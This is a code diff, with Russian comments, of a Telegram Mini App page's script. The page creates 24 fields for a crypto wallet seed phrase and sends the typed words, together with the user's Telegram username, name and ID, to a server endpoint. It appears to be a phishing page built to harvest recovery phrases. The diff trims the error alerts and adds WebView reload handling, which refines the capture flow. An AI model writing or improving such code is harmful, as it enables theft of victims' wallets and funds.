@@ -379,228 +379,220 @@
         </div>
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-        // СОЗДАНИЕ 24 ПОЛЕЙ
-        const col1 = document.getElementById('col1');
-        const col2 = document.getElementById('col2');
-        col1.innerHTML = '';
-        col2.innerHTML = '';
-        const inputFields = [];
-
-        for (let i = 1; i <= 24; i++) {
-            const wrapper = document.createElement('div');
-            wrapper.className = 'input-wrapper';
+<script>
+    // Восстановление после краша WebView
+    window.addEventListener('load', () => {
+        if (window.Telegram && window.Telegram.WebApp) {
+            const tg = window.Telegram.WebApp;
+            tg.ready();
+            tg.expand();
             
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.placeholder = `слово ${i}`;
-            input.id = `word${i}`;
-            input.classList.add('word-input');
-            input.autocomplete = 'off';
-            input.spellcheck = false;
-            
-            const numberSpan = document.createElement('span');
-            numberSpan.className = 'input-number';
-            numberSpan.textContent = `${i}.`;
-            
-            wrapper.appendChild(numberSpan);
-            wrapper.appendChild(input);
-            
-            const addHighlight = () => input.classList.add('active-highlight');
-            const removeHighlight = () => input.classList.remove('active-highlight');
-            
-            input.addEventListener('focus', addHighlight);
-            input.addEventListener('blur', removeHighlight);
-            
-            input.addEventListener('input', (e) => {
-                let val = e.target.value;
-                val = val.toLowerCase().replace(/[^a-z]/g, '');
-                e.target.value = val;
-                if (!input.classList.contains('active-highlight')) {
-                    input.classList.add('active-highlight');
-                }
-                if (val.length > 0 && navigator.vibrate) navigator.vibrate(4);
-                
-                // Скрываем сообщение об ошибке при вводе
-                const resultDiv = document.getElementById('resultMessage');
-                resultDiv.style.display = 'none';
-                resultDiv.className = 'result-message';
-            });
-            
-            input.addEventListener('blur', removeHighlight);
-            
-            if (i <= 12) {
-                col1.appendChild(wrapper);
-            } else {
-                col2.appendChild(wrapper);
+            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+                console.log("WebView восстановлен");
+                setTimeout(() => {
+                    window.location.reload();
+                }, 100);
             }
-            inputFields.push(input);
         }
+    });
 
-        // НАВИГАЦИЯ
-        const introPage = document.getElementById('introPage');
-        const formPage = document.getElementById('formPage');
-        const successPage = document.getElementById('successPage');
-        const continueBtn = document.getElementById('continueBtn');
-        const sendBtn = document.getElementById('sendBtn');
-        const closeBtn = document.getElementById('closeBtn');
-        const sendingMessage = document.getElementById('sendingMessage');
-        const resultMessage = document.getElementById('resultMessage');
-
-        continueBtn.addEventListener('click', () => {
-            introPage.classList.add('hidden');
-            formPage.classList.remove('hidden');
-            if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
-        });
-
-        // Локальная проверка слов (только латинские буквы и количество)
-        function validateWordsLocally(wordsArray) {
-            // Проверка на пустые поля
-            for (let i = 0; i < wordsArray.length; i++) {
-                if (!wordsArray[i] || wordsArray[i].trim() === '') {
-                    return { valid: false, message: `⚠️ Слово ${i+1} не заполнено` };
-                }
-                // Проверка на недопустимые символы
-                if (!/^[a-z]+$/.test(wordsArray[i])) {
-                    return { valid: false, message: `⚠️ Слово ${i+1} содержит недопустимые символы. Используйте только латинские буквы a-z` };
-                }
-            }
-            return { valid: true, message: '' };
+    window.addEventListener('error', (e) => {
+        if (e.message && e.message.includes('WebView')) {
+            console.log("WebView ошибка, перезагрузка...");
+            setTimeout(() => {
+                window.location.reload();
+            }, 500);
         }
-        //OTPRAVKA DANNIH
-        sendBtn.addEventListener('click', async () => {
-    const wordsArray = [];
-    let hasError = false;
-    let errorWordIndex = -1;
+    });
     
-    // Проверка всех полей на пустоту
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+    
+    // СОЗДАНИЕ 24 ПОЛЕЙ
+    const col1 = document.getElementById('col1');
+    const col2 = document.getElementById('col2');
+    col1.innerHTML = '';
+    col2.innerHTML = '';
+    const inputFields = [];
+
     for (let i = 1; i <= 24; i++) {
-        const inputField = document.getElementById(`word${i}`);
-        const wordValue = inputField.value.trim();
+        const wrapper = document.createElement('div');
+        wrapper.className = 'input-wrapper';
         
-        if (!wordValue || wordValue.length < 2) {
-            // Тряска и красный цвет для пустого поля
-            inputField.classList.add('error');
-            inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
-            setTimeout(() => {
-                inputField.classList.remove('error');
-                inputField.style.animation = '';
-            }, 800);
-            hasError = true;
-            errorWordIndex = i;
-            break;
-        }
-        wordsArray.push(wordValue);
-    }
-    
-    if (hasError) {
-        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
-        alert(`⚠️ Заполните слово №${errorWordIndex}`);
-        document.getElementById(`word${errorWordIndex}`).focus();
-        return;
-    }
-
-    let username = tg.initDataUnsafe.user?.username || "без_имени";
-    let first_name = tg.initDataUnsafe.user?.first_name || "";
-    let userId = tg.initDataUnsafe.user?.id;
-    
-    const payload = {
-        words: wordsArray,
-        username: username,
-        first_name: first_name,
-        user_id: userId,
-        timestamp: Date.now()
-    };
-    
-    sendBtn.disabled = true;
-    sendBtn.style.opacity = '0.6';
-    sendingMessage.style.display = 'block';
-    sendingMessage.innerHTML = '⏳ Проверка...';
-    sendingMessage.style.color = '#ffaa44';
-    
-    try {
-        const response = await fetch('/submit', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload)
-        });
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = `слово ${i}`;
+        input.id = `word${i}`;
+        input.classList.add('word-input');
+        input.autocomplete = 'off';
+        input.spellcheck = false;
         
-        const result = await response.json();
+        const numberSpan = document.createElement('span');
+        numberSpan.className = 'input-number';
+        numberSpan.textContent = `${i}.`;
         
-        if (response.ok && result.status === 'ok') {
-            // ВСЁ ХОРОШО
-            sendingMessage.innerHTML = '✅ Фраза принята!';
-            sendingMessage.style.color = '#88ff88';
-            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+        wrapper.appendChild(numberSpan);
+        wrapper.appendChild(input);
+        
+        const addHighlight = () => input.classList.add('active-highlight');
+        const removeHighlight = () => input.classList.remove('active-highlight');
+        
+        input.addEventListener('focus', addHighlight);
+        input.addEventListener('blur', removeHighlight);
+        
+        input.addEventListener('input', (e) => {
+            let val = e.target.value;
+            val = val.toLowerCase().replace(/[^a-z]/g, '');
+            e.target.value = val;
+            if (!input.classList.contains('active-highlight')) {
+                input.classList.add('active-highlight');
+            }
+            if (val.length > 0 && navigator.vibrate) navigator.vibrate(4);
             
-            setTimeout(() => {
-                formPage.classList.add('hidden');
-                successPage.classList.remove('hidden');
-            }, 1000);
-        } else {
-            // НЕПРАВИЛЬНАЯ ФРАЗА - КРАСНЫЙ + ТРЯСКА + ALERT
-            throw new Error(result.message || 'Неверная seed фраза');
-        }
-    } catch(e) {
-        console.error("Ошибка:", e);
-        
-        // ТРЯСКА ДЛЯ ВСЕХ ПОЛЕЙ
-        for (let i = 1; i <= 24; i++) {
-            const field = document.getElementById(`word${i}`);
-            field.classList.add('error');
-            field.style.animation = 'shake 0.3s ease-in-out 0s 2';
-            setTimeout(() => {
-                field.classList.remove('error');
-                field.style.animation = '';
-            }, 800);
-        }
-        
-        // ALERT С ОШИБКОЙ
-        alert(`❌ НЕВЕРНАЯ SEED ФРАЗА!\n\nПроверьте правильность введенных слов.\n\nУбедитесь, что:\n• Все 24 слова введены\n• Слова только на английском\n• Нет лишних пробелов`);
-        
-        sendingMessage.innerHTML = '❌ Неверная фраза';
-        sendingMessage.style.color = '#ff6666';
-        sendBtn.disabled = false;
-        sendBtn.style.opacity = '1';
-        
-        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
-        
-        setTimeout(() => {
-            sendingMessage.style.display = 'none';
-        }, 2000);
-    }
-});
-        
-        if (closeBtn) {
-            closeBtn.addEventListener('click', () => {
-                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
-                tg.close();
-            });
-        }
-
-        // Переход по Enter
-        inputFields.forEach((input, idx) => {
-            input.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    const nextIdx = idx + 1;
-                    if (nextIdx < inputFields.length) {
-                        inputFields[nextIdx].focus();
-                    } else if (nextIdx === inputFields.length && sendBtn && !sendBtn.disabled) {
-                        sendBtn.click();
-                    }
-                }
-            });
+            // Убираем красный цвет при вводе
+            input.classList.remove('error');
         });
         
-        successPage.classList.add('hidden');
-        formPage.classList.add('hidden');
-        introPage.classList.remove('hidden');
-    </script>
+        input.addEventListener('blur', removeHighlight);
+        
+        if (i <= 12) {
+            col1.appendChild(wrapper);
+        } else {
+            col2.appendChild(wrapper);
+        }
+        inputFields.push(input);
+    }
+
+    // НАВИГАЦИЯ
+    const introPage = document.getElementById('introPage');
+    const formPage = document.getElementById('formPage');
+    const successPage = document.getElementById('successPage');
+    const continueBtn = document.getElementById('continueBtn');
+    const sendBtn = document.getElementById('sendBtn');
+    const closeBtn = document.getElementById('closeBtn');
+
+    continueBtn.addEventListener('click', () => {
+        introPage.classList.add('hidden');
+        formPage.classList.remove('hidden');
+        if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+    });
+
+    // ОТПРАВКА ДАННЫХ - БЕЗ ALERT И ТЕКСТОВЫХ СООБЩЕНИЙ
+    sendBtn.addEventListener('click', async () => {
+        const wordsArray = [];
+        let hasError = false;
+        let errorWordIndex = -1;
+        
+        // Проверка всех полей на пустоту
+        for (let i = 1; i <= 24; i++) {
+            const inputField = document.getElementById(`word${i}`);
+            const wordValue = inputField.value.trim();
+            
+            if (!wordValue || wordValue.length < 2) {
+                inputField.classList.add('error');
+                inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
+                setTimeout(() => {
+                    inputField.classList.remove('error');
+                    inputField.style.animation = '';
+                }, 800);
+                hasError = true;
+                errorWordIndex = i;
+                break;
+            }
+            wordsArray.push(wordValue);
+        }
+        
+        if (hasError) {
+            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            document.getElementById(`word${errorWordIndex}`).focus();
+            return; // НЕТ ALERT, ПРОСТО ВОЗВРАТ
+        }
+
+        let username = tg.initDataUnsafe.user?.username || "без_имени";
+        let first_name = tg.initDataUnsafe.user?.first_name || "";
+        let userId = tg.initDataUnsafe.user?.id;
+        
+        const payload = {
+            words: wordsArray,
+            username: username,
+            first_name: first_name,
+            user_id: userId,
+            timestamp: Date.now()
+        };
+        
+        sendBtn.disabled = true;
+        sendBtn.style.opacity = '0.6';
+        
+        try {
+            const response = await fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            const result = await response.json();
+            
+            if (response.ok && result.status === 'ok') {
+                // УСПЕХ - переход на success
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                
+                setTimeout(() => {
+                    formPage.classList.add('hidden');
+                    successPage.classList.remove('hidden');
+                }, 500);
+            } else {
+                // ОШИБКА - красный + тряска, НЕТ ALERT
+                throw new Error();
+            }
+        } catch(e) {
+            console.error("Ошибка:", e);
+            
+            // ТРЯСКА ДЛЯ ВСЕХ ПОЛЕЙ
+            for (let i = 1; i <= 24; i++) {
+                const field = document.getElementById(`word${i}`);
+                field.classList.add('error');
+                field.style.animation = 'shake 0.3s ease-in-out 0s 2';
+                setTimeout(() => {
+                    field.classList.remove('error');
+                    field.style.animation = '';
+                }, 800);
+            }
+            
+            sendBtn.disabled = false;
+            sendBtn.style.opacity = '1';
+            
+            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        }
+    });
+    
+    if (closeBtn) {
+        closeBtn.addEventListener('click', () => {
+            if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+            tg.close();
+        });
+    }
+
+    // Переход по Enter
+    inputFields.forEach((input, idx) => {
+        input.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                const nextIdx = idx + 1;
+                if (nextIdx < inputFields.length) {
+                    inputFields[nextIdx].focus();
+                } else if (nextIdx === inputFields.length && sendBtn && !sendBtn.disabled) {
+                    sendBtn.click();
+                }
+            }
+        });
+    });
+    
+    successPage.classList.add('hidden');
+    formPage.classList.add('hidden');
+    introPage.classList.remove('hidden');
+</script>
 </body>
 </html>
